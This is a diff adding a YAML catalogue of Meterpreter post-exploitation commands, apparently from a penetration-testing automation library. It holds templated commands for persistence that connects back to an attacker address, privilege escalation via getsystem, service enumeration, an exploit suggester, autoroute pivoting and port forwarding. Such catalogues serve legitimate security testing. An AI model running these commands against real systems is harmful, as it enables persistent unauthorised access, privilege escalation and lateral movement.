@@ -1,0 +1,52 @@
+---
+name: Meterpreter
+description: Metasploit's network-extensible payload with in-memory DLL injection stagers
+os: Linux
+ptf_module: modules/exploitation/metasploit
+---
+commands:
+  - "Automated Persistence":
+    - type: ["meterpreter","interactive"]
+    - text: "run persistence -U -i {INT} -p {INT} -r {IPV4}"
+    - input: ["session number","port number","attacker IPv4 address"]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Enumerate Windows Services for EoP":
+    - type: ["meterpreter","interactive"]
+    - text: "run post/windows/gather/enum_services"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Privilege Escalation (via getsystem)":
+    - type: ["meterpreter","interactive"]
+    - text: "getsystem"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Run Local EoP Exploit Suggester":
+    - type: ["meterpreter","interactive"]
+    - text: "run post/multi/recon/local_exploit_suggester"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Autoroute via Meterpreter Session":
+    - type: ["meterpreter","interactive"]
+    - text:
+      - "run autoroute -s {IPV4CIDR}"
+      - "run autoroute -p"
+    - input: ["target network, IPv4 CIDR"]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+  - "Port Forward via Meterpreter Host":
+    - type: ["meterpreter","interactive"]
+    - text: "portfwd add -L {IPV4} -l {INT} -p {INT} -r {IPV4}"
+    - input: ["meterpreter hosts's local IPv4 address","meterpreter host's local listening port number","remote port number","remote IPv4 address"]
+    - output: ["STDOUT",{"PROMPT":"meterpreter"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-x"
+
+...
